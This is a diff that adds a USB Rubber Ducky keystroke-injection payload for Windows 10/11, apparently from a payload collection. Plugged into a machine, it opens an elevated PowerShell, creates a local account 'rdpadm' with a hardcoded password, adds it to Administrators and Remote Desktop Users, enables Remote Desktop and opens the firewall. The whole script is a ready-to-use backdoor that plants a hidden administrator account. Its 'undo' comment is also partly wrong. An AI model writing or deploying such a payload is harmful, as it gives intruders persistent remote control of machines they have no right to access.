@@ -1,0 +1,21 @@
+REM Title:Add RDP Admin Account
+REM Author: 3mrgnc3
+REM Description: Create an RDP admin account, enable RDP and allow RDP throug hthe firewall
+REM Target: Windows 10/11
+
+REM Comment: Undo commands with: Remove-LocalUser rdpadm;Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0; Disable-NetFirewallRule -DisplayGroup 'Remote Desktop';
+
+DUCKY_LANG US
+DEFINE #HID_DELAY 1200
+
+DELAY 6000
+GUI x
+DELAY #HID_DELAY
+STRING a
+DELAY #HID_DELAY
+LEFT
+DELAY #HID_DELAY
+ENTER
+DELAY 5000
+STRING New-LocalUser 'rdpadm'-Password (ConvertTo-SecureString 'R3M07@2W1n!' -AsPlainText -Force) -PasswordNeverExpires; Add-LocalGroupMember -Group 'Administrators' -Member 'rdpadm'; Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'rdpadm';Set-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections' 0; Enable-NetFirewallRule -DisplayGroup 'Remote Desktop';exit
+ENTER
